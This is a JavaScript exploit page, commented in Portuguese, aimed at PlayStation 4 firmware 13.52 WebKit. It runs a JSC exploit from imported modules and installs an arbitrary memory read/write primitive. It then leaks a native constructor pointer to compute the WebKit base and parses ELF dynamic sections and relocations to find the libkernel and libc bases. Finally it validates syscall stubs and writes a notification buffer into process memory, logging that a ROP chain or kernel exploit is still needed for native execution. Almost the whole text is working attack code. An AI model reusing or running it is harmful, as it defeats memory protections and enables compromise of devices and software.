<script type="module">
import { int64 }              from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP }     from './resources/mem.js';
globalThis.int64 = int64;

const $con = document.getElementById('con');
const $dot = document.getElementById('dot');
const $st  = document.getElementById('st');
const $fw  = document.getElementById('fw');

function log(m, c='i') {
  const d = document.createElement('div');
  d.className = c; d.textContent = m;
  $con.appendChild(d);
  $con.scrollTop = $con.scrollHeight;
  while ($con.children.length > 600) $con.removeChild($con.firstChild);
}
function logH(m) { log('=== ' + m + ' ===', 's'); }
function setStatus(m, s='r') {
  $st.textContent = m; $dot.className = s;
}
function setCard(id, v) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = v; el.classList.remove('na');
}

/* mem.js: read1/read2/read4/read8 — aliases para o codigo original */
function patchPrim(p) {
  if (!p.read32 && p.read4) p.read32 = function(a){ return p.read4(a); };
  if (!p.read16 && p.read2) p.read16 = function(a){ return p.read2(a); };
  if (!p.read64 && p.read8) p.read64 = function(a){ return p.read8(a); };
  return p;
}

async function resolveAllBases(p, webkitBase) {
  logH('PARSING ELF DO WEBKIT');

  let magic = p.read32(webkitBase);
  if (magic !== 0x464C457F) {
    log('[-] WebKit base sem ELF magic! magic=0x' + (magic>>>0).toString(16), 'e');
    log('[!] Em SPRX o header ELF NAO fica no loadBase (LOAD começa em file+0x4000).', 'w');
    return null;
  }
  log('[+] ELF magic valido');

  let phoff = p.read64(webkitBase.add32(0x20));
  let phnum = p.read16(webkitBase.add32(0x38));
  log('[+] Program headers: ' + phnum + ' entries, offset=0x' + phoff.toString(16));

  let dynamicVaddr = null;
  let dynamicSize = 0;
  for (let i = 0; i < phnum; i++) {
    let phAddr = webkitBase.add32(phoff.low + i * 0x38);
    let p_type = p.read32(phAddr);
    if (p_type === 2) {
      dynamicVaddr = p.read64(phAddr.add32(0x10));
      dynamicSize  = p.read64(phAddr.add32(0x28)).low;
      log('[+] PT_DYNAMIC: vaddr=0x' + dynamicVaddr.toString(16) + ' size=0x' + dynamicSize.toString(16));
      break;
    }
  }
  if (!dynamicVaddr) {
    log('[-] PT_DYNAMIC nao encontrado', 'e');
    return null;
  }

  let strtab = null, symtab = null, jmprel = null, pltrelsz = 0;
  for (let off = 0; off < dynamicSize; off += 16) {
    let entry = dynamicVaddr.add32(off);
    let tag = p.read64(entry).low;
    let val = p.read64(entry.add32(8));
    if (tag === 5)  strtab = val;
    if (tag === 6)  symtab = val;
    if (tag === 23) jmprel = val;
    if (tag === 2)  pltrelsz = val.low;
    if (tag === 0)  break;
  }
  log('[+] strtab=0x' + (strtab ? strtab.toString(16) : 'null'));
  log('[+] symtab=0x' + (symtab ? symtab.toString(16) : 'null'));
  log('[+] jmprel=0x' + (jmprel ? jmprel.toString(16) : 'null') + ' pltrelsz=' + pltrelsz);

  let imports = {};
  let numRela = Math.floor(pltrelsz / 24);
  log('[+] Varrendo ' + numRela + ' entradas RELA...');

  for (let i = 0; i < numRela; i++) {
    let rela = jmprel.add32(i * 24);
    let r_offset = p.read64(rela);
    let r_info   = p.read64(rela.add32(8)).low;
    let symIdx   = r_info >>> 32;

    let st_name = p.read32(symtab.add32(symIdx * 24));
    let name = '';
    for (let j = 0; j < 128; j++) {
      let ch = p.read1(strtab.add32(st_name + j));
      if (ch === 0) break;
      name += String.fromCharCode(ch);
    }

    if (name.length > 0) {
      let wkOffset = r_offset.sub(webkitBase);
      let importPtr = p.read8(r_offset);
      imports[name] = { wkOffset, importPtr };
    }
  }
  log('[+] ' + Object.keys(imports).length + ' imports parseados');

  let useful = ['memset','memcpy','strcmp','strlen','pthread_create',
                '__stack_chk_guard','sceKernelDlsym','sceKernelSendNotificationRequest',
                'sceKernelGetpid','sceKernelUsleep'];
  for (let name of useful) {
    if (imports[name]) {
      log('    ' + name + ': offset=0x' + imports[name].wkOffset.toString(16) + ' ptr=0x' + imports[name].importPtr.toString(16), 'd');
    }
  }

  let libkernelBase = null;
  let libcBase = null;

  function findElfBase(p, startPtr, maxBack) {
    for (let back = 0; back < maxBack; back += 0x1000) {
      try {
        let test = startPtr.sub32(back);
        if (p.read32(test) === 0x464C457F) {
          return test;
        }
      } catch(e) {}
    }
    return null;
  }

  let lkRef = imports['__stack_chk_guard'] || imports['sceKernelGetpid'] || imports['sceKernelUsleep'];
  if (lkRef) {
    libkernelBase = findElfBase(p, lkRef.importPtr, 0x200000);
    if (libkernelBase) {
      log('[+] libkernel base encontrada: 0x' + libkernelBase.toString(16), 'ok');
      setCard('c-lk', '0x' + libkernelBase.toString(16));
    } else {
      log('[-] Nao foi possivel encontrar base da libkernel', 'w');
    }
  }

  if (imports['memset']) {
    libcBase = findElfBase(p, imports['memset'].importPtr, 0x200000);
    if (libcBase) {
      log('[+] libc base encontrada: 0x' + libcBase.toString(16), 'ok');
      setCard('c-lc', '0x' + libcBase.toString(16));
    } else {
      log('[-] Nao foi possivel encontrar base da libc', 'w');
    }
  }

  return { imports, libkernelBase, libcBase };
}

async function validateBases(p, libkernelBase, libcBase) {
  logH('VALIDANDO BASES');
  let valid = { libkernel: false, libc: false };

  if (libkernelBase) {
    let magic = p.read32(libkernelBase);
    if (magic === 0x464C457F) {
      log('[OK] libkernel: ELF magic valido', 'ok');
      valid.libkernel = true;
    } else {
      log('[X] libkernel: ELF magic invalido (0x' + (magic>>>0).toString(16) + ')', 'e');
    }
  }

  if (libcBase) {
    let magic = p.read32(libcBase);
    if (magic === 0x464C457F) {
      log('[OK] libc: ELF magic valido', 'ok');
      valid.libc = true;
    } else {
      log('[X] libc: ELF magic invalido (0x' + (magic>>>0).toString(16) + ')', 'e');
    }
  }

  if (libkernelBase && valid.libkernel) {
    let foundStubs = 0;
    for (let off = 0; off < 0x100000; off += 0x10) {
      try {
        let b0 = p.read1(libkernelBase.add32(off));
        let b1 = p.read1(libkernelBase.add32(off + 1));
        let b2 = p.read1(libkernelBase.add32(off + 2));
        if (b0 === 0x48 && b1 === 0xC7 && b2 === 0xC0) {
          let b7 = p.read1(libkernelBase.add32(off + 7));
          let b8 = p.read1(libkernelBase.add32(off + 8));
          let b9 = p.read1(libkernelBase.add32(off + 9));
          if (b7 === 0x49 && b8 === 0x89 && b9 === 0xCA) {
            foundStubs++;
            if (foundStubs >= 3) break;
          }
        }
      } catch(e) {}
    }
    if (foundStubs >= 3) {
      log('[OK] libkernel: ' + foundStubs + ' stubs de syscall', 'ok');
    } else {
      log('[X] libkernel: poucos stubs (' + foundStubs + ')', 'w');
      valid.libkernel = false;
    }
  }

  if (imports && imports['memset'] && libcBase && valid.libc) {
    let memsetPtr = imports['memset'].importPtr;
    let b0 = p.read1(memsetPtr);
    if (b0 !== 0x00 && b0 !== 0xCC && b0 !== 0xFF) {
      log('[OK] libc: memset codigo valido (0x' + b0.toString(16) + ')', 'ok');
    } else {
      log('[X] libc: memset suspeito (0x' + b0.toString(16) + ')', 'w');
    }
  }

  if (libkernelBase) {
    let aligned = (libkernelBase.low & 0xFFF) === 0;
    log(aligned ? '[OK] libkernel alinhada' : '[X] libkernel NAO alinhada', aligned ? 'ok' : 'w');
    if (!aligned) valid.libkernel = false;
  }
  if (libcBase) {
    let aligned = (libcBase.low & 0xFFF) === 0;
    log(aligned ? '[OK] libc alinhada' : '[X] libc NAO alinhada', aligned ? 'ok' : 'w');
    if (!aligned) valid.libc = false;
  }

  return valid;
}

function prepareNotification(p, libkernelBase, imports, text) {
  logH('PREPARANDO BUFFER DE NOTIFICACAO');

  let notifyImport = imports['sceKernelSendNotificationRequest'];
  if (!notifyImport) {
    log('[-] sceKernelSendNotificationRequest nao encontrado!', 'e');
    return null;
  }

  let notifyFunc = notifyImport.importPtr;
  log('[+] Endereco alvo da API: 0x' + notifyFunc.toString(16));

  let encoder = new TextEncoder();
  let msgBytes = encoder.encode(text + '\x00');

  let buf = new Uint8Array(0x400);
  buf[4] = 0;
  buf.set(msgBytes, 0x20);

  let arrCell = p.leakval(buf);
  let backingStore = p.read8(arrCell.add32(0x10));

  p.write8(backingStore.add32(0x8), backingStore.add32(0x20));
  p.write4(backingStore.add32(0x10), msgBytes.length);

  log('[+] Buffer alocado em: 0x' + backingStore.toString(16), 'ok');

  return {
    notifyFunc,
    requestBuffer: backingStore
  };
}

let imports = null;

async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? 'PlayStation 4 — firmware ' + fw[1] : 'UA: ' + ua.slice(0, 40);
  log('UA: ' + ua, 'd');

  setStatus('Rodando exploit JSC (core.js)...', 'r');
  logH('EXPLOIT JSC (WebKit)');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = 'tentativa: ' + (attempt || 1);
        document.getElementById('bg').textContent = 'estagio: ' + tag.toLowerCase();
        log('[' + tag + '] ' + detail, 'i');
      },
      maxAttempts: 0
    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] core.js: exploit JSC concluido!', 'ok');
  setStatus('Instalando R/W arbitrario...', 'r');
  logH('INSTALANDO PRIMITIVA R/W (mem.js)');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => {
        log('  [mem/' + tag + '] ' + detail, 'd');
      }
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  p = patchPrim(p);

  log('[+] R/W arbitrario: window.p instalado com sucesso!', 'ok');
  setStatus('Mapeando bases com estabilidade...', 'r');
  logH('MAPEAMENTO DA 13.52');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor === 'number' && ctor > 0x100000000) {
    const hi = Math.floor(ctor / 0x100000000);
    const lo = ctor - hi * 0x100000000;
    const ctorInt64 = new int64(lo >>> 0, hi >>> 0);

    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(16), 'a');

    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
               ? OFFSET_wk_host_constructor_candidates[0]
               : 0x36F9E20;

    const resolvedBaseVal = ctor - hc;
    const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
    const baseLo = resolvedBaseVal - baseHi * 0x100000000;
    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);

    log('[+] WebKit Base calculada: 0x' + webkitBase.toString(16), 'ok');
    setCard('c-wk', '0x' + webkitBase.toString(16));

    setTimeout(async () => {
      const result = await resolveAllBases(p, webkitBase);
      if (!result) {
        setStatus('Falha na resolucao de bases (sem ELF magic — esperado em SPRX)', 'e');
        return;
      }

      imports = result.imports;
      const libKernelBase = result.libkernelBase;
      const libcBase = result.libcBase;

      const valid = await validateBases(p, libKernelBase, libcBase);

      if (!valid.libkernel) {
        setCard('c-lk', 'Falha na validacao');
        log('[-] libkernel base nao passou na validacao', 'e');
      }
      if (!valid.libc) {
        setCard('c-lc', 'Falha na validacao');
        log('[-] libc base nao passou na validacao', 'e');
      }

      if (valid.libkernel) {
        try {
          const notif = prepareNotification(p, libKernelBase, imports, 'Hello World from PS4 13.52!');
          if (notif) {
            setCard('c-g', 'Pronto');
            setStatus('Buffer de notificacao pronto!', 'ok');
            log('[OK] Configuracao de notificacao concluida.', 'ok');

            const cbox = document.getElementById('cbox');
            cbox.style.display = 'block';
            document.getElementById('c-out').textContent =
                'WebKit Base     = 0x' + webkitBase.toString(16) + '\n' +
                'libkernel Base  = 0x' + (libKernelBase ? libKernelBase.toString(16) : 'N/A') + '\n' +
                'libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'N/A') + '\n' +
                'Buffer Notif    = 0x' + notif.requestBuffer.toString(16) + '\n' +
                'Funcao Target   = 0x' + notif.notifyFunc.toString(16) + '\n' +
                'Notify Offset   = 0x' + (imports['sceKernelSendNotificationRequest'] ? imports['sceKernelSendNotificationRequest'].wkOffset.toString(16) : 'N/A');

            logH('NOTIFICACAO');
            log('[+] Offset dinamico de sceKernelSendNotificationRequest: 0x' + imports['sceKernelSendNotificationRequest'].wkOffset.toString(16), 'i');
            log('[!] Execucao nativa requer ROP chain ou JIT pivot (nao implementado)', 'w');
            log('[!] Status: userland R/W ativo. Kernel exploit necessario para execucao real.', 'w');

          } else {
            setCard('c-g', 'Falha');
            log('[-] Falha ao preparar buffer de notificacao', 'e');
          }
        } catch (e) {
          log('[-] Erro ao preparar buffer: ' + e.message, 'e');
        }
      } else {
        setCard('c-g', 'Falha LK');
        log('[-] Nao foi possivel resolver a libkernel para o buffer.', 'e');
      }
    }, 1000);

  } else {
    log('[-] Falha: __ps5NativeCtor nao foi capturado corretamente.', 'e');
    setStatus('Erro ao capturar NativeCtor', 'e');
  }
}

main();
